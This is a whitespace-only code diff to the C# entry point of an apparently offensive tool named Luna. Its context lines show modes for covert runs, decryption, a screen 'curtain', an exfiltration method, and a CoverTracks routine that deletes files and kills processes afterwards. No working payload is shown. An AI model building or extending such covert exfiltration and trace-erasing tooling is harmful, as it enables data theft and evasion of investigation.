@@ -31,12 +31,13 @@ namespace Luna
         startDecrypt = 4,
         startCovertRun = 5
     }
+
     static class Program
     {
         [DllImport("kernel32.dll")]
         static extern bool AttachConsole(int dwProcessId);
         private const int ATTACH_PARENT_PROCESS = -1;
-        
+
         // Main Entry point
         [STAThread]
         static void Main(string[] args)
@@ -74,6 +75,7 @@ namespace Luna
                     // Start the mission
                     string curtainStyle = LunaGeneral.hasSwitch(args, "curtain");
                     string exfilMethod = LunaGeneral.hasSwitch(args, "exfil");
+
                     startMission(curtainStyle, exfilMethod, args);                    
                     break;
                 }
@@ -188,7 +190,7 @@ namespace Luna
             }
         }
 
-        // Start curtain and exfiltration
+        // Start curtain and exfiltration    
         static void startMission(string curtain, string exfilMethod, string[] args)
         {
             Luna.Common.CurtainStyle curtainStyle = Common.CurtainStyle.Undefined;
@@ -276,6 +278,7 @@ namespace Luna
             Application.Run(startCurtain);
             startCurtain.Dispose();
             // Remove temporary files afterwards
+
             CoverTracks.Instance.ClearAllFiles();
             // ... as well as any running processes
             CoverTracks.Instance.ClearAllProcesses();
